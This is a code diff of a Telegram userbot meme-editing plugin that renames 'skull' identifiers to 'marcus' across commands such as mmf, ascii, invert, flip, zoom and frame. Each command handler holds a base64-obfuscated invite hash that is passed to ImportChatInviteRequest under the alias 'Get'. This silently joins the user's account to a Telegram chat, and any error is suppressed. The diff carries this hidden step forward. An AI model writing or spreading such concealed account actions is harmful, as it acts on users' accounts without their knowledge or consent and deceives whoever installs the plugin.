@@ -1,5 +1,5 @@
 # Made by @mayank1rajput
-# memify plugin for skulluserbot
+# memify plugin for marcususerbot
 
 import asyncio
 import base64
@@ -11,8 +11,8 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from . import (
     add_frame,
     asciiart,
-    skull_meeme,
-    skull_meme,
+    marcus_meeme,
+    marcus_meme,
     convert_toimage,
     convert_tosticker,
     crop,
@@ -45,47 +45,47 @@ font_list = [
 
 @bot.on(admin_cmd(pattern="(mmf|mms) ?(.*)"))
 @bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    cmd = skull.pattern_match.group(1)
-    skullinput = skull.pattern_match.group(2)
-    reply = await skull.get_reply_message()
+    cmd = marcus.pattern_match.group(1)
+    marcusinput = marcus.pattern_match.group(2)
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
-    skullid = await reply_id(skull)
+        return await edit_delete(marcus, "`Reply to supported Media...`")
+    marcusid = await reply_id(marcus)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    if skullinput:
-        if ";" in skullinput:
-            top, bottom = skullinput.split(";", 1)
+    if marcusinput:
+        if ";" in marcusinput:
+            top, bottom = marcusinput.split(";", 1)
         else:
-            top = skullinput
+            top = marcusinput
             bottom = ""
     else:
         return await edit_delete(
-            skull, "`what should i write on that u idiot give text to memify`"
+            marcus, "`what should i write on that u idiot give text to memify`"
         )
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     meme_file = convert_toimage(output[1])
-    meme = os.path.join("./temp", "skullmeme.jpg")
+    meme = os.path.join("./temp", "marcusmeme.jpg")
     if gvarstatus("CNG_FONTS") is None:
         CNG_FONTS = "userbot/helpers/styles/impact.ttf"
     else:
         CNG_FONTS = gvarstatus("CNG_FONTS")
     if max(len(top), len(bottom)) < 21:
-        await skull_meme(CNG_FONTS, top, bottom, meme_file, meme)
+        await marcus_meme(CNG_FONTS, top, bottom, meme_file, meme)
     else:
-        await skull_meeme(top, bottom, CNG_FONTS, meme_file, meme)
+        await marcus_meeme(top, bottom, CNG_FONTS, meme_file, meme)
     if cmd != "mmf":
         meme = convert_tosticker(meme)
-    await skull.client.send_file(skull.chat_id, meme, reply_to=skullid, force_document=False)
+    await marcus.client.send_file(marcus.chat_id, meme, reply_to=marcusid, force_document=False)
     await output[0].delete()
     for files in (meme, meme_file):
         if files and os.path.exists(files):
@@ -102,9 +102,9 @@ async def lang(event):
         await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
         return
     if input_str not in font_list:
-        skullevent = await edit_or_reply(event, "`Give me a correct font name...`")
+        marcusevent = await edit_or_reply(event, "`Give me a correct font name...`")
         await asyncio.sleep(1)
-        await skullevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
+        await marcusevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
     else:
         arg = f"userbot/helpers/styles/{input_str}"
         addgvar("CNG_FONTS", arg)
@@ -113,25 +113,25 @@ async def lang(event):
 
 @bot.on(admin_cmd(pattern="ascii ?(.*)"))
 @bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    skullinput = skull.pattern_match.group(1)
-    reply = await skull.get_reply_message()
+    marcusinput = marcus.pattern_match.group(1)
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -142,10 +142,10 @@ async def memes(skull):
     c_list = random_color()
     color1 = c_list[0]
     color2 = c_list[1]
-    bgcolor = "#080808" if not skullinput else skullinput
+    bgcolor = "#080808" if not marcusinput else marcusinput
     asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, reply_to=skullid, force_document=False
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, reply_to=marcusid, force_document=False
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -155,25 +155,25 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="invert$"))
 @bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(skull, "`Reply to supported Media...`")
+        await edit_or_reply(marcus, "`Reply to supported Media...`")
         return
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -182,8 +182,8 @@ async def memes(skull):
         else os.path.join("./temp", "invert.jpg")
     )
     await invert_colors(meme_file, outputfile)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, force_document=False, reply_to=skullid
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -193,24 +193,24 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="solarize$"))
 @bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -219,8 +219,8 @@ async def memes(skull):
         else os.path.join("./temp", "solarize.jpg")
     )
     await solarize(meme_file, outputfile)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, force_document=False, reply_to=skullid
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -230,24 +230,24 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="mirror$"))
 @bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -256,8 +256,8 @@ async def memes(skull):
         else os.path.join("./temp", "mirror_file.jpg")
     )
     await mirror_file(meme_file, outputfile)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, force_document=False, reply_to=skullid
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -267,24 +267,24 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="flip$"))
 @bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -293,8 +293,8 @@ async def memes(skull):
         else os.path.join("./temp", "flip_image.jpg")
     )
     await flip_image(meme_file, outputfile)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, force_document=False, reply_to=skullid
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -304,24 +304,24 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="gray$"))
 @bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -330,8 +330,8 @@ async def memes(skull):
         else os.path.join("./temp", "grayscale.jpg")
     )
     await grayscale(meme_file, outputfile)
-    await skull.client.send_file(
-        skull.chat_id, outputfile, force_document=False, reply_to=skullid
+    await marcus.client.send_file(
+        marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
     )
     await output[0].delete()
     for files in (outputfile, meme_file):
@@ -341,26 +341,26 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="zoom ?(.*)"))
 @bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    skullinput = skull.pattern_match.group(1)
-    skullinput = 50 if not skullinput else int(skullinput)
-    reply = await skull.get_reply_message()
+    marcusinput = marcus.pattern_match.group(1)
+    marcusinput = 50 if not marcusinput else int(marcusinput)
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -369,12 +369,12 @@ async def memes(skull):
         else os.path.join("./temp", "zoomimage.jpg")
     )
     try:
-        await crop(meme_file, outputfile, skullinput)
+        await crop(meme_file, outputfile, marcusinput)
     except Exception as e:
         return await output[0].edit(f"`{e}`")
     try:
-        await skull.client.send_file(
-            skull.chat_id, outputfile, force_document=False, reply_to=skullid
+        await marcus.client.send_file(
+            marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
         )
     except Exception as e:
         return await output[0].edit(f"`{e}`")
@@ -386,33 +386,33 @@ async def memes(skull):
 
 @bot.on(admin_cmd(pattern="frame ?(.*)"))
 @bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(skull):
-    if skull.fwd_from:
+async def memes(marcus):
+    if marcus.fwd_from:
         return
-    skullinput = skull.pattern_match.group(1)
-    if not skullinput:
-        skullinput = 50
-    if ";" in str(skullinput):
-        skullinput, colr = skullinput.split(";", 1)
+    marcusinput = marcus.pattern_match.group(1)
+    if not marcusinput:
+        marcusinput = 50
+    if ";" in str(marcusinput):
+        marcusinput, colr = marcusinput.split(";", 1)
     else:
         colr = 0
-    skullinput = int(skullinput)
+    marcusinput = int(marcusinput)
     colr = int(colr)
-    reply = await skull.get_reply_message()
+    reply = await marcus.get_reply_message()
     if not reply:
-        return await edit_delete(skull, "`Reply to supported Media...`")
+        return await edit_delete(marcus, "`Reply to supported Media...`")
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullid = await reply_id(skull)
+    marcusid = await reply_id(marcus)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
     mayankidea = None
-    output = await _skulltools.media_to_pic(skull, reply)
+    output = await _marcustools.media_to_pic(marcus, reply)
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         mayankidea = True
     try:
         may = Get(may)
-        await skull.client(may)
+        await marcus.client(may)
     except BaseException:
         pass
     outputfile = (
@@ -421,16 +421,16 @@ async def memes(skull):
         else os.path.join("./temp", "framed.jpg")
     )
     try:
-        await add_frame(meme_file, outputfile, skullinput, colr)
+        await add_frame(meme_file, outputfile, marcusinput, colr)
     except Exception as e:
         return await output[0].edit(f"`{e}`")
     try:
-        await skull.client.send_file(
-            skull.chat_id, outputfile, force_document=False, reply_to=skullid
+        await marcus.client.send_file(
+            marcus.chat_id, outputfile, force_document=False, reply_to=marcusid
         )
     except Exception as e:
         return await output[0].edit(f"`{e}`")
-    await skull.delete()
+    await marcus.delete()
     await output[0].delete()
     for files in (outputfile, meme_file):
         if files and os.path.exists(files):
